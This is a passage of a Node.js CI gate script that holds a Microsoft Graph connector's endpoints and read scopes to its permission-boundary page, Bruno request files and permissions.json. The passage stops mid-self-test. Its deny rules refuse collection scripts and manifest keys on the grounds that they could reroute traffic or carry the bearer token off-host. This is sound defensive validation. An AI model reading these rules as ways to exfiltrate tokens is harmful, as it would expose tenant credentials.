#!/usr/bin/env node
// Graph permission boundary — the page that tells a tenant administrator what to
// grant must name every endpoint and every scope the connector actually reads.
//
// WHY THIS EXISTS. `docs/connectors/MICROSOFT_GRAPH_PERMISSION_BOUNDARY.md` was
// rewritten on 2026-08-25 because every permission on it had been invented. It
// then said, correctly, "No gate currently reads this document, so nothing catches
// it drifting from the connector again." On 2026-09-06 (Batch K, #463) the
// connector gained a third read — `/identityProtection/riskyUsers`, needing
// `IdentityRiskyUser.Read.All`, answering 403 → `unknown` without it — and the
// commit updated seven records and not this page. An administrator following the
// page ("Grant nothing else") would provision a connector that grades every
// subject's risk `unknown` forever, and the page would present that as complete.
// The code fails closed; the document loosened the deployment. Drift window: the
// hours between that merge and this gate.
//
// THE RULE, both directions, mechanical:
//   · every Graph URL literal the connector builds (`${this.baseUrl}/<path>`)
//     appears, query stripped, in the page's endpoint table;
//   · every `<Name>.Read.All` scope the connector names appears in the page's
//     scope table;
//   · and the page's tables name nothing the connector does not — "grant nothing
//     else" is only true if the tables hold nothing else.
// Prose outside the tables (the deferred `User-LifeCycleInfo.Read.All` paragraph)
// is not a grant instruction and is not read.
//
// SECOND RECORD SET (plan row 30, part a — this is that row's "transport abstraction
// check"). The page is not the only consent record. `artifacts/lab-collections/
// microsoft-graph/` transcribes the connector's OWN transport as Bruno requests and
// carries `permissions.json`, which its README calls "the record a tenant admin
// consents from". When the connector gained `/identityProtection/riskyUsers` neither
// was updated, and nothing read them: a tenant admin consenting from permissions.json
// under-provisioned, and the connector graded every subject's risk `unknown`. So this
// gate also holds that folder to the connector, both directions:
//   · every request literal the connector builds, query INCLUDED, has a .bru file;
//   · every .bru request is a connector request (a request there asserts "the product
//     uses this"; it must not assert more);
//   · the permission names in permissions.json equal the scopes the connector names;
//   · every connector request sits under at least one `usedBy`, and every `usedBy`
//     entry is a connector request;
//   · floors (3 connector requests, 3 request files, 2 permissions) so a parser that
//     goes blind cannot pass vacuously; a missing folder or unreadable file is FATAL.
// It does NOT prove (a) that a request needs the permission its `usedBy` pairs it with
// — that is Microsoft's published fact, not derivable from the connector (part b,
// the msgraph-metadata OpenAPI cross-diff, would catch a wrong pairing), nor (b) that
// the request answers on a real tenant (the live-tenant milestone).
// Request files are read by a strict column-0 block parser (parseBru), not a regex over the whole file: Bruno merges every http block and
// the LAST wins, so exactly one method block, no stray text and one url key are required, and the result must agree with check-lab-collections'
// REQUEST_BLOCK. Sandbox.bru must carry exactly one baseUrl.
// Known residual (LOW): the connector scan is anchored on the rawGet/getAllPages choke point, so a read that bypasses both (a new
// fetch path) is caught only by the single-transport-call rule; Bruno constructs outside meta/method/docs blocks are refused, not interpreted.
//
//   node scripts/check-graph-permission-boundary.mjs [--self-test] [--root <dir>]

import { cpSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { spawnSync } from "node:child_process";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import { REQUEST_BLOCK } from "./check-lab-collections.mjs";

const repoRoot = resolve(dirname(fileURLToPath(import.meta.url)), "..");
export const CONNECTOR = "lib/integrations/src/integrations/graph/posture-connector.ts";
export const COLLECTION_DIR = "artifacts/lab-collections/microsoft-graph";
export const PERMISSIONS = `${COLLECTION_DIR}/permissions.json`;
export const DOC = "docs/connectors/MICROSOFT_GRAPH_PERMISSION_BOUNDARY.md";

/** Pure: distinct endpoint paths the connector builds, query strings stripped. */
export function connectorEndpoints(src) {
  const out = new Set();
  for (const m of src.matchAll(/\$\{this\.baseUrl\}(\/[A-Za-z0-9_./-]+)/g)) out.add(m[1]);
  return [...out].sort();
}

/** A Graph permission name: `Name.Read`, `Name.ReadWrite.All`, `Name.Read.All`, … (not only `.Read.All`, so a wider scope cannot hide). */
const SCOPE = "[A-Z][A-Za-z0-9-]*\\.(?:Read|ReadWrite|ReadBasic|Write)(?:\\.[A-Za-z]+)?";

/** Pure: distinct `Something.Read.All` scopes the connector names (comments included — they are the contract). */
export function connectorScopes(src) {
  return [...new Set([...src.matchAll(new RegExp(`\\b(${SCOPE})\\b`, "g"))].map((m) => m[1]))].sort();
}

/** Pure: backticked `/path` cells in the page's tables, query strings stripped. */
export function docEndpoints(md) {
  const out = new Set();
  for (const line of md.split("\n")) {
    const m = /^\|\s*`(\/[A-Za-z0-9_./-]+)(?:\?[^`]*)?`\s*\|/.exec(line);
    if (m) out.add(m[1]);
  }
  return [...out].sort();
}

/** Pure: backticked scope cells in the page's tables. */
export function docScopes(md) {
  const out = new Set();
  for (const line of md.split("\n")) {
    const m = new RegExp(`^\\|\\s*\`(${SCOPE})\`\\s*\\|`).exec(line);
    if (m) out.add(m[1]);
  }
  return [...out].sort();
}

/** Pure audit over the two texts. */
export function auditBoundary(connectorSrc, docMd) {
  const fatal = [];
  const ce = connectorEndpoints(connectorSrc);
  const cs = connectorScopes(connectorSrc);
  const de = docEndpoints(docMd);
  const ds = docScopes(docMd);
  if (ce.length === 0) fatal.push("the connector source yields no `${this.baseUrl}/…` endpoint — the parser or the connector changed shape; refusing to conclude anything");
  if (cs.length === 0) fatal.push("the connector source names no `*.Read.All` scope — the parser or the connector changed shape");
  for (const e of ce) if (!de.includes(e)) fatal.push(`the connector reads ${e} and the page's endpoint table does not list it — an administrator following the page under-provisions`);
  for (const s of cs) if (!ds.includes(s)) fatal.push(`the connector needs ${s} and the page's scope table does not list it — "grant nothing else" would leave that read answering 403`);
  for (const e of de) if (!ce.includes(e)) fatal.push(`the page lists ${e} and the connector does not read it — a grant the code cannot justify`);
  for (const s of ds) if (!cs.includes(s)) fatal.push(`the page lists ${s} and the connector never names it — a grant the code cannot justify`);
  return { fatal, connectorEndpoints: ce, connectorScopes: cs, docEndpoints: de, docScopes: ds };
}

/** Floors: below these the parsers have gone blind, and "nothing missing" would be a vacuous pass. */
export const FLOORS = { connectorRequests: 3, collectionFiles: 3, permissions: 2 };

/** Pure: distinct request literals the connector builds, path AND query, cut at the closing backtick. */
export function connectorRequests(src) {
  const out = new Set();
  for (const m of src.matchAll(/\$\{this\.baseUrl\}(\/[^`]*)/g)) out.add(m[1]);
  return [...out].sort();
}

/** Pure: `this.baseUrl` used in any form but the `${this.baseUrl}/…` template or its one constructor assignment — a read the literal scan cannot see. */
export function unseenBaseUrlUses(src) {
  const rest = src.replace(/\$\{this\.baseUrl\}\/[^`]*/g, "").replace(/this\.baseUrl\s*=\s/, "");
  return [...rest.matchAll(/this\.baseUrl\b/g)].length;
}

/**
 * Pure: reads the literal scan cannot see, anchored on the choke point. Every `this.rawGet(` / `this.getAllPages(` call must be handed a
 * `${this.baseUrl}/…` literal (the one pager call `this.rawGet(url)` excepted), no other absolute URL may appear, and the transport is
 * invoked in exactly one place. Returns human-readable violations.
 */
export function chokePointViolations(src) {
  const out = [];
  let pager = 0;
  for (const m of src.matchAll(/this\.(rawGet|getAllPages)\s*(?:<[^>]*>)?\s*\(\s*([\s\S]{0,40})/g)) {
    const arg = m[2];
    if (arg.startsWith("`${this.baseUrl}/")) continue;
    if (m[1] === "rawGet" && /^url\s*\)/.test(arg)) { pager += 1; continue; }
    out.push(`this.${m[1]}(${arg.split("\n")[0].trim()}…) is not handed a \`\${this.baseUrl}/…\` literal`);
  }
  if (pager > 1) out.push(`${pager} pager calls \`this.rawGet(url)\` — only the one @odata.nextLink follow-up is allowed`);
  const abs = [...src.matchAll(/https?:\/\/[^\s"'`)]+/g)].length;
  if (abs > 1) out.push(`${abs} absolute http(s) URLs in the connector — only the one default base URL is allowed`);
  const tr = [...src.matchAll(/this\.transport\s*\(/g)].length;
  if (tr > 1) out.push(`the transport is invoked in ${tr} places — every read must funnel through rawGet`);
  return out;
}

/** Pure: the connector's default Graph base URL (what `{{baseUrl}}` must resolve to), or null. */
export function connectorDefaultBase(src) {
  const m = /config\.baseUrl\s*\?\?\s*"([^"]+)"/.exec(src);
  return m ? m[1] : null;
}

/**
 * Pure: a strict reader for the Bruno file shape this collection uses. A block opens at column 0 with `name {` and closes at the first line that starts with
 * `}` (nothing may follow it); anything else outside a block, an unterminated block, or a non-`key: value` line inside a non-docs block is a fatal. Returns
 * { blocks: [{ name, entries: [[key, value]] }], fatal }. Indented text inside `docs` is prose and is never read as a block.
 */
export function parseBru(text) {
  const fatal = [];
  const blocks = [];
  let cur = null;
  // Bruno reads a triple-quote as the start of a multiline value that swallows column-0 closing braces; this reader does not model it and this collection never uses one.
  if (text.includes("'''")) fatal.push("contains a triple-quote multiline value, which this reader does not model (Bruno would swallow the following closing braces) - refusing");
  for (const [i, line] of text.split("\n").entries()) {
    if (cur === null) {
      if (line.trim() === "") continue;
      const m = /^([A-Za-z][\w:-]*)\s*\{\s*$/.exec(line);
      if (!m) { fatal.push(`line ${i + 1} is outside any block (${JSON.stringify(line.slice(0, 40))}) — an unrecognised construct`); continue; }
      cur = { name: m[1], entries: [] };
    } else if (line.startsWith("}")) {
      // Bruno ends a block at any newline followed by `}`, whatever follows it on the line; so must this reader, or `}post {` hides a second http block.
      if (line.slice(1).trim() !== "") fatal.push(`line ${i + 1}: text after a closing brace (${JSON.stringify(line.slice(0, 40))}) — Bruno would read it as a new block`);
      blocks.push(cur); cur = null;
    }
    else if (cur.name === "docs") { (cur.lines ??= []).push(line); }
    else if (cur.name !== "docs" && line.trim() !== "") {
      const kv = /^\s+([A-Za-z][\w-]*):[ \t]*(.*?)\s*$/.exec(line);
      if (!kv) fatal.push(`line ${i + 1} in \`${cur.name}\` is not a \`key: value\` line`);
      else cur.entries.push([kv[1], kv[2]]);
    }
  }
  if (cur !== null) fatal.push(`block \`${cur.name}\` is never closed`);
  return { blocks, fatal };
}

/**
 * Pure: the canonical shape of a request file. The reader above is not Bruno's parser, and Bruno's grammar has corners (multiline values,
 * where a block ends) the reader has diverged on before; so the files are also held to a grammar narrow enough that no such corner can occur:
 * `meta` keys name/type/seq, a method block of url/body/auth with body `none` and auth `inherit`, and `docs` lines that are indented prose
 * with no braces, backticks or quotes-pairs. Anything else is refused rather than interpreted.
 */
export function canonicalFindings(blocks) {
  const out = [];
  const bare = /^[^{}`"]*$/;
  for (const bl of blocks) {
    if (bl.name === "docs") {
      for (const l of bl.lines ?? []) if (l.trim() !== "" && (!/^ {2}/.test(l) || !bare.test(l))) out.push(`docs line ${JSON.stringify(l.slice(0, 40))} is not indented prose free of braces, backticks and double quotes`);
    } else if (bl.name === "meta") {
      for (const [k, v] of bl.entries) {
        if (!["name", "type", "seq"].includes(k)) out.push(`meta key \`${k}\` is not one of name, type, seq`);
        else if (!bare.test(v) || v.includes("'" + "'")) out.push(`meta ${k} value has braces, backticks or quotes`);
        else if (k === "type" && v !== "http") out.push("meta type is not http");
        else if (k === "seq" && !/^\d+$/.test(v)) out.push("meta seq is not a number");
      }
    } else {
      for (const [k, v] of bl.entries) {
        if (k === "body" && v !== "none") out.push(`body is \`${v}\`, not \`none\` — a request body could change what is sent`);
        if (k === "auth" && v !== "inherit") out.push(`auth is \`${v}\`, not \`inherit\``);
        if (k === "url" && /[`"']/.test(v)) out.push("url contains a quote or backtick");
      }
    }
  }
  return out;
}

/**
 * Pure: collection.bru is a Bruno-evaluated sink (a script block there rewrites every request and carries the bearer token), so it goes
 * through the strict reader and must be exactly an `auth { mode: bearer }` block and an `auth:bearer { token: {{graphToken}} }` block.
 * Indented block names, which Bruno accepts and a column-0 regex would miss, are text outside any block here and so refused.
 */
export function collectionBruFindings(text) {
  const out = [];
  const p = parseBru(text);
  out.push(...p.fatal.map((f) => `collection.bru: ${f}`));
  const names = p.blocks.map((bl) => bl.name);
  if (names.join() !== "auth,auth:bearer") out.push(`collection.bru: blocks [${names.join(", ")}] — exactly auth then auth:bearer are allowed (a collection-level script could rewrite every request and carry the token off-host)`);
  for (const bl of p.blocks) {
    const want = bl.name === "auth" ? [["mode", "bearer"]] : [["token", "{{graphToken}}"]];
    if (JSON.stringify(bl.entries) !== JSON.stringify(want)) out.push(`collection.bru: block \`${bl.name}\` entries ${JSON.stringify(bl.entries)} differ from ${JSON.stringify(want)}`);
  }
  return out;
}

/** Pure: bruno.json may carry only version, name, type and an `ignore` list of node_modules/.git — a `proxy`, `scripts` or `presets` key can reroute traffic. */
export function brunoJsonFindings(text) {
  if (typeof text !== "string") return ["bruno.json is missing — the collection manifest cannot be skipped"];
  let doc;
  try { doc = JSON.parse(text); } catch (e) { return [`bruno.json does not parse: ${e.message}`]; }
  if (doc === null || typeof doc !== "object" || Array.isArray(doc)) return ["bruno.json is not an object"];
  const out = [];
  for (const k of Object.keys(doc)) if (!["version", "name", "type", "ignore"].includes(k)) out.push(`bruno.json has key \`${k}\` — only version, name, type and ignore are allowed (proxy/scripts/presets/clientCertificates can reroute or rewrite traffic)`);
  if (doc.ignore !== undefined && !(Array.isArray(doc.ignore) && doc.ignore.every((x) => ["node_modules", ".git"].includes(x)))) out.push("bruno.json `ignore` may list only node_modules and .git (an ignored request file would escape this gate)");
  for (const k of ["version", "name", "type"]) if (doc[k] !== undefined && typeof doc[k] !== "string") out.push(`bruno.json \`${k}\` is not a string`);
  return out;
}

/** Pure: one entry per request file ({ file, method, path }); anything but a GET on `{{baseUrl}}/…` is fatal. */
export function collectionRequests(filesByName) {
  const fatal = [];
  const requests = [];
  for (const name of Object.keys(filesByName).sort()) {
    if (name === "collection.bru") { fatal.push(...collectionBruFindings(filesByName[name])); continue; }
    if (name.includes("/")) { fatal.push(`${name}: a request file in a subdirectory — only top-level request files are allowed (Bruno skips node_modules, .git and folder.bru)`); continue; }
    if (!/^[A-Za-z0-9][A-Za-z0-9-]*\.bru$/.test(name)) { fatal.push(`${name}: not a plain \`<stem>.bru\` file name — Bruno needs a non-empty extension (path.extname('.bru') is empty, so a file named exactly .bru is never run) and this gate accepts only letters, digits and hyphens in the stem`); continue; }
    if (name === "folder.bru") { fatal.push("folder.bru: a folder-level file Bruno treats specially (it can carry scripts and settings) and never runs as a request — refusing"); continue; }
    if (!name.endsWith(".bru")) continue;
    const parsed = parseBru(filesByName[name]);
    if (parsed.fatal.length > 0) { fatal.push(...parsed.fatal.map((f) => `${name}: ${f}`)); continue; }
    const METHODS = ["get", "post", "put", "delete", "patch", "head", "options"];
    const odd = parsed.blocks.filter((bl) => !["meta", "docs", ...METHODS].includes(bl.name));
    if (odd.length > 0) { fatal.push(`${name}: Bruno block(s) ${odd.map((bl) => `\`${bl.name}\``).join(", ")} can change what is sent (query, vars, script, headers, body) and this gate reads only \`url:\` — refusing`); continue; }
    const canon = canonicalFindings(parsed.blocks);
    if (canon.length > 0) { fatal.push(...canon.map((f) => `${name}: ${f}`)); continue; }
    const methodBlocks = parsed.blocks.filter((bl) => METHODS.includes(bl.name));
    if (methodBlocks.length !== 1) { fatal.push(`${name}: ${methodBlocks.length} method block(s) — exactly one is required (Bruno merges every http block and the last wins, so a second block hides the request this gate sees)`); continue; }
    if (parsed.blocks.filter((bl) => bl.name === "meta").length !== 1) { fatal.push(`${name}: not exactly one meta block`); continue; }
    if (parsed.blocks.filter((bl) => bl.name === "docs").length > 1) { fatal.push(`${name}: more than one docs block`); continue; }
    const mb = methodBlocks[0];
    const method = mb.name.toUpperCase();
    const keys = mb.entries.map(([k]) => k);
    if (new Set(keys).size !== keys.length || keys.some((k) => !["url", "body", "auth"].includes(k))) { fatal.push(`${name}: method block keys [${keys.join(", ")}] — only one each of url, body, auth are allowed`); continue; }
    const url = (mb.entries.find(([k]) => k === "url") ?? [])[1];
    if (typeof url !== "string" || url === "") { fatal.push(`${name}: the method block has no url`); continue; }
    if (/\s/.test(url)) { fatal.push(`${name}: url \`${url}\` has whitespace inside — Bruno sends the whole line, so the gate would see a narrower request than is sent`); continue; }
    const lm = REQUEST_BLOCK.exec(filesByName[name]);
    if (!lm || lm[1].toUpperCase() !== method || lm[2] !== url) { fatal.push(`${name}: the strict parse (${method} ${url}) and check-lab-collections' REQUEST_BLOCK (${lm ? `${lm[1].toUpperCase()} ${lm[2]}` : "no match"}) disagree — the two gates must read the same request`); continue; }
    if (method !== "GET") { fatal.push(`${name}: ${method} — the Graph connector is read-only; a non-GET request asserts a write the product never makes`); continue; }
    if (!url.startsWith("{{baseUrl}}/")) { fatal.push(`${name}: url ${url} does not start with {{baseUrl}}/ — it is not the connector's transport`); continue; }
    requests.push({ file: name, method, path: url.slice("{{baseUrl}}".length) });
  }
  return { requests, fatal };
}

/** Pure: the permission record. Returns { permissions: [{ permission, kind, usedBy: [path…] }], fatal }. */
export function permissionRecord(jsonText) {
  const fatal = [];
  const permissions = [];
  let doc;
  try { doc = JSON.parse(jsonText); } catch (e) { return { permissions, fatal: [`permissions.json does not parse: ${e.message}`] }; }
  if (doc === null || typeof doc !== "object" || Array.isArray(doc)) return { permissions, fatal: ["permissions.json is not an object"] };
  for (const k of Object.keys(doc)) if (!["$comment", "application", "delegated", "notRequested"].includes(k)) fatal.push(`permissions.json has an unknown top-level key \`${k}\` — a grant placed outside \`application\`/\`delegated\` would be invisible to this gate`);
  for (const kind of ["application", "delegated"]) {
    if (!Array.isArray(doc[kind])) { fatal.push(`permissions.json \`${kind}\` is missing or not an array — the consent record has the wrong shape`); continue; }
    doc[kind].forEach((p, i) => {
      const where = `permissions.json ${kind}[${i}]`;
      if (kind === "delegated") fatal.push(`${where}: the connector holds an application token and consents nothing delegated — a delegated entry is a grant the code cannot justify`);
      if (p === null || typeof p !== "object" || typeof p.permission !== "string" || !p.permission) { fatal.push(`${where}: no \`permission\` string`); return; }
      for (const k of Object.keys(p)) if (!["permission", "usedBy", "why"].includes(k)) fatal.push(`${where} (${p.permission}): unknown key \`${k}\` — a grant outside \`permission\` would be invisible to this gate`);
      if (!Array.isArray(p.usedBy)) { fatal.push(`${where} (${p.permission}): \`usedBy\` is not an array`); return; }
      const usedBy = [];
      for (const u of p.usedBy) {
        const m = typeof u === "string" ? /^GET (\/\S*)$/.exec(u) : null;
        if (!m) fatal.push(`${where} (${p.permission}): usedBy entry ${JSON.stringify(u)} is not of the form \`GET <path+query>\``);
        else usedBy.push(m[1]);
      }
      permissions.push({ permission: p.permission, kind, usedBy });
    });
  }
  return { permissions, fatal };
}

/** Pure audit: the connector against the lab collection and permissions.json, both directions. */
export function auditCollection(connectorSrc, bruByName, permissionsText, envText, brunoText) {
  const fatal = [];
  const cr = connectorRequests(connectorSrc);
  const cs = connectorScopes(connectorSrc);
  const col = collectionRequests(bruByName);
  const rec = permissionRecord(permissionsText);
  fatal.push(...col.fatal, ...rec.fatal, ...brunoJsonFindings(brunoText));
  const colPaths = new Set(col.requests.map((r) => r.path));
  const perms = new Set(rec.permissions.map((p) => p.permission));
  const usedBy = new Set(rec.permissions.flatMap((p) => p.usedBy));
  const ub = unseenBaseUrlUses(connectorSrc);
  if (ub > 0) fatal.push(`the connector uses \`this.baseUrl\` ${ub} time(s) outside the \`\${this.baseUrl}/…\` template — a read built another way (concatenation, a helper) is invisible to this gate; build it as a literal or extend the gate`);
  for (const v of chokePointViolations(connectorSrc)) fatal.push(`connector read the gate cannot transcribe: ${v}`);
  const defBase = connectorDefaultBase(connectorSrc);
  let envBase;
  if (typeof envText === "string") {
    const pe = parseBru(envText);
    for (const f of pe.fatal) fatal.push(`environments/Sandbox.bru: ${f}`);
    const odd = pe.blocks.filter((bl) => !["vars", "vars:secret"].includes(bl.name));
    if (odd.length > 0) fatal.push(`environments/Sandbox.bru: block(s) ${odd.map((bl) => bl.name).join(", ")} — only vars blocks are allowed`);
    const bases = pe.blocks.flatMap((bl) => bl.entries.filter(([k]) => k === "baseUrl").map(([, v]) => v));
    if (bases.length > 1) fatal.push(`environments/Sandbox.bru: ${bases.length} baseUrl entries — Bruno keeps the last, so the first cannot be the one checked`);
    envBase = bases.length === 1 ? bases[0] : undefined;
  }
  if (!defBase) fatal.push("the connector's default base URL could not be read — refusing to conclude the collection targets the same endpoint");
  else if (envBase !== defBase) fatal.push(`environments/Sandbox.bru baseUrl is ${envBase ?? "missing"} and the connector's default is ${defBase} — the collection would send requests to a different endpoint (e.g. /beta)`);
  const usedByCount = rec.permissions.reduce((n, p) => n + p.usedBy.length, 0);
  if (cr.length < FLOORS.connectorRequests) fatal.push(`floor: the connector yields ${cr.length} request literal(s), under ${FLOORS.connectorRequests} — the parser or the connector changed shape; refusing to conclude anything`);
  if (col.requests.length < FLOORS.collectionFiles) fatal.push(`floor: the collection holds ${col.requests.length} request file(s), under ${FLOORS.collectionFiles}`);
  if (rec.permissions.length < FLOORS.permissions) fatal.push(`floor: permissions.json holds ${rec.permissions.length} permission(s), under ${FLOORS.permissions}`);
  for (const r of cr) {
    if (!colPaths.has(r)) fatal.push(`the connector makes GET ${r} and ${COLLECTION_DIR} has no request file for it — the collection no longer transcribes the transport (exact path and query: the $select is the privacy posture)`);
    if (!usedBy.has(r)) fatal.push(`the connector makes GET ${r} and no permissions.json \`usedBy\` names it — the consent record does not cover a read the connector makes`);
  }
  for (const r of col.requests) if (!cr.includes(r.path)) fatal.push(`${r.file} asserts GET ${r.path} and the connector never makes it — a collection request must not assert more than posture-connector.ts does`);
  for (const u of usedBy) if (!cr.includes(u)) fatal.push(`permissions.json usedBy names GET ${u} and the connector never makes it — a grant the code cannot justify`);
  for (const s of cs) if (!perms.has(s)) fatal.push(`the connector needs ${s} and permissions.json does not list it — a tenant admin consenting from it under-provisions, and the read answers 403 so the connector grades every subject \`unknown\``);
  for (const p of perms) if (!cs.includes(p)) fatal.push(`permissions.json lists ${p} and the connector never names it — a grant the code cannot justify`);
  return {
    fatal,
    counts: { connectorRequests: cr.length, collectionFiles: col.requests.length, distinctCollectionRequests: colPaths.size, permissions: rec.permissions.length, usedBy: usedByCount },
  };
}

/** Reads the collection directory (recursively; `environments/` holds only Sandbox.bru, which is not a request) and permissions.json. Missing or unreadable is FATAL, never a skip. */
export function loadCollection(root) {
  const fatal = [];
  const bruByName = {};
  const dir = join(root, COLLECTION_DIR);
  const walk = (rel) => {
    let entries = [];
    try { entries = readdirSync(join(dir, rel), { withFileTypes: true }); }
    catch (e) { fatal.push(`${COLLECTION_DIR}/${rel}`.replace(/\/$/, "") + `: ${e.code === "ENOENT" ? "missing" : `unreadable (${e.message})`} — the collection is the second consent record; absence is not a skip`); return; }
    for (const d of entries) {
      const r = rel ? `${rel}/${d.name}` : d.name;
      if (d.isSymbolicLink()) { fatal.push(`${COLLECTION_DIR}/${r}: a symlink — the gate will not follow it, so what it points at would go unchecked`); continue; }
      if (d.isDirectory()) {
        // Bruno hides node_modules, .git, any path containing node_modules, and collection.bru/folder.bru at depth; the gate would still count what is inside. Only environments/ may exist.
        if (r !== "environments") { fatal.push(`${COLLECTION_DIR}/${r}/: a subdirectory — Bruno skips some directories (node_modules, .git) and treats folder.bru specially, so a request file inside could be counted here and never sent; only environments/ is allowed`); continue; }
        walk(r); continue;
      }
      if (rel === "environments") { if (d.name !== "Sandbox.bru") fatal.push(`${COLLECTION_DIR}/${r}: a second environment file — only Sandbox.bru is read, so a different baseUrl here would go unchecked`); continue; }
      if (!d.name.endsWith(".bru")) { if (!["README.md", "bruno.json", "permissions.json"].includes(r)) fatal.push(`${COLLECTION_DIR}/${r}: an unrecognised file — a request format this gate does not read (e.g. .yml) would be invisible to it`); continue; }
      try { bruByName[r] = readFileSync(join(dir, r), "utf8"); }
      catch (e) { fatal.push(`${COLLECTION_DIR}/${r}: unreadable (${e.message})`); }
    }
  };
  walk("");
  let permissionsText = "";
  try { permissionsText = readFileSync(join(root, PERMISSIONS), "utf8"); }
  catch (e) { fatal.push(`${PERMISSIONS}: ${e.code === "ENOENT" ? "missing" : `unreadable (${e.message})`} — the consent record cannot be skipped`); }
  let envText = "";
  try { envText = readFileSync(join(dir, "environments/Sandbox.bru"), "utf8"); }
  catch (e) { fatal.push(`${COLLECTION_DIR}/environments/Sandbox.bru: ${e.code === "ENOENT" ? "missing" : `unreadable (${e.message})`} — {{baseUrl}} has nothing to resolve to`); }
  let brunoText;
  try { brunoText = readFileSync(join(dir, "bruno.json"), "utf8"); }
  catch (e) { fatal.push(`${COLLECTION_DIR}/bruno.json: ${e.code === "ENOENT" ? "missing" : `unreadable (${e.message})`} — the collection manifest cannot be skipped`); }
  return { bruByName, permissionsText, envText, brunoText, fatal };
}

/** Everything the gate concludes, in one place so the self-test runs the same aggregation the CLI does. */
export function auditAll(connectorSrc, docMd, lc) {
  const r = auditBoundary(connectorSrc, docMd);
  const cr = auditCollection(connectorSrc, lc.bruByName, lc.permissionsText, lc.envText, lc.brunoText);
  return { boundary: r, counts: cr.counts, fatal: [...r.fatal, ...lc.fatal, ...cr.fatal] };
}

function selfTest() {
  const checks = [];
  const src = [
    "const a = `${this.baseUrl}/users?$select=id`;",
    "const b = `${this.baseUrl}/deviceManagement/managedDevices`;",
    "// Needs the IdentityRiskyUser.Read.All scope",
    "const c = `${this.baseUrl}/identityProtection/riskyUsers?$select=id`;",
    "/** e.g. User.Read.All, DeviceManagementManagedDevices.Read.All */",
  ].join("\n");
  const md = [
    "| Endpoint | Why |", "| --- | --- |",
    "| `/users?$select=id,userPrincipalName` | identity |",
    "| `/deviceManagement/managedDevices` | devices |",
    "| `/identityProtection/riskyUsers?$select=id` | risk |",
    "| Scope | Needed for |", "| --- | --- |",
    "| `User.Read.All` | users |", "| `DeviceManagementManagedDevices.Read.All` | devices |", "| `IdentityRiskyUser.Read.All` | risk |",
    "A third scope, `User-LifeCycleInfo.Read.All`, is declared by a deferred family — prose, not a table row.",
  ].join("\n");
  let r = auditBoundary(src, md);
  checks.push(["a page naming exactly what the connector reads passes (positive control)", r.fatal.length === 0 && r.connectorEndpoints.length === 3 && r.connectorScopes.length === 3]);
  checks.push(["query strings are stripped on both sides, so `$select` churn is not drift", r.docEndpoints.includes("/users") && r.connectorEndpoints.includes("/users")]);
  checks.push(["a scope named only in PROSE is not a grant instruction (the deferred family's scope)", !r.docScopes.includes("User-LifeCycleInfo.Read.All")]);
  r = auditBoundary(src, md.split("\n").filter((l) => !l.includes("riskyUsers")).join("\n"));
  checks.push(["THE PLANTED MISS: an endpoint the connector reads that the page omits is FATAL", r.fatal.some((f) => f.includes("/identityProtection/riskyUsers") && f.includes("under-provisions"))]);
  r = auditBoundary(src, md.split("\n").filter((l) => !l.includes("IdentityRiskyUser")).join("\n"));
  checks.push(["…and a scope the connector needs that the page omits is FATAL — the 2026-09-06 drift, reproduced", r.fatal.some((f) => f.includes("IdentityRiskyUser.Read.All") && f.includes("403"))]);
  r = auditBoundary(src, md + "\n| `Directory.Read.All` | everything |");
  checks.push(["a scope the page lists that the connector never names is FATAL — a grant the code cannot justify", r.fatal.some((f) => f.includes("Directory.Read.All"))]);
  r = auditBoundary("const x = 1;", md);
  checks.push(["a connector that yields no endpoints refuses to conclude (never a vacuous pass)", r.fatal.some((f) => f.includes("refusing"))]);
  const live = auditBoundary(readFileSync(join(repoRoot, CONNECTOR), "utf8"), readFileSync(join(repoRoot, DOC), "utf8"));
  checks.push(["LIVE: the connector reads at least three endpoints and the page names every one of them", live.connectorEndpoints.length >= 3 && live.fatal.length === 0]);

  // ---- the lab collection and permissions.json ----
  const csrc = [
    'this.baseUrl = (config.baseUrl ?? "https://graph.microsoft.com/v1.0").replace(/\\/$/, "");',
    "const a = `${this.baseUrl}/deviceManagement/managedDevices?$top=1`;",
    "const b = `${this.baseUrl}/users?$select=id,userPrincipalName,accountEnabled`;",
    "const c = `${this.baseUrl}/deviceManagement/managedDevices`;",
    "// Needs the IdentityRiskyUser.Read.All scope; e.g. User.Read.All, DeviceManagementManagedDevices.Read.All",
    "const d = `${this.baseUrl}/identityProtection/riskyUsers?$select=id,riskLevel,riskState`;",
  ].join("\n");
  const P = { probe: "/deviceManagement/managedDevices?$top=1", users: "/users?$select=id,userPrincipalName,accountEnabled", dev: "/deviceManagement/managedDevices", risky: "/identityProtection/riskyUsers?$select=id,riskLevel,riskState" };
  const bru = (path, method = "get", base = "{{baseUrl}}") => `meta {\n  name: x\n}\n\n${method} {\n  url: ${base}${path}\n  body: none\n  auth: inherit\n}\n\ndocs {\n  x\n}\n`;
  const baseBru = () => ({ "a.bru": bru(P.probe), "b.bru": bru(P.users), "c.bru": bru(P.dev), "d.bru": bru(P.risky), "collection.bru": "auth {\n  mode: bearer\n}\n\nauth:bearer {\n  token: {{graphToken}}\n}\n" });
  const permObj = () => ({
    application: [
      { permission: "DeviceManagementManagedDevices.Read.All", usedBy: [`GET ${P.probe}`, `GET ${P.dev}`], why: "x" },
      { permission: "User.Read.All", usedBy: [`GET ${P.users}`], why: "x" },
      { permission: "IdentityRiskyUser.Read.All", usedBy: [`GET ${P.risky}`], why: "x" },
    ],
    delegated: [],
  });
  const pj = (o) => JSON.stringify(o);
  const ENV = "vars {\n  baseUrl: https://graph.microsoft.com/v1.0\n  graphToken: x\n}\n";
  const BRUNO = JSON.stringify({ version: "1", name: "x", type: "collection", ignore: ["node_modules", ".git"] });
  const audit = (src = csrc, b = baseBru(), p = pj(permObj()), env = ENV, br = BRUNO) => auditCollection(src, b, p, env, br);
  const has = (r, ...needles) => r.fatal.some((f) => needles.every((n) => f.includes(n)));
  let c = audit();
  checks.push(["COLLECTION: the connector, four request files and a three-permission record agree (positive control)", c.fatal.length === 0 && c.counts.connectorRequests === 4 && c.counts.collectionFiles === 4 && c.counts.permissions === 3 && c.counts.usedBy === 4]);
  checks.push(["COLLECTION: connectorRequests keeps the query, and connectorEndpoints still strips it", connectorRequests(csrc).includes(P.users) && connectorEndpoints(csrc).includes("/users")]);
  let b = baseBru(); delete b["d.bru"];
  c = audit(csrc, b);
  checks.push(["COLLECTION: a request file missing for a request the connector makes is FATAL and names it", has(c, "identityProtection/riskyUsers", "no request file")]);
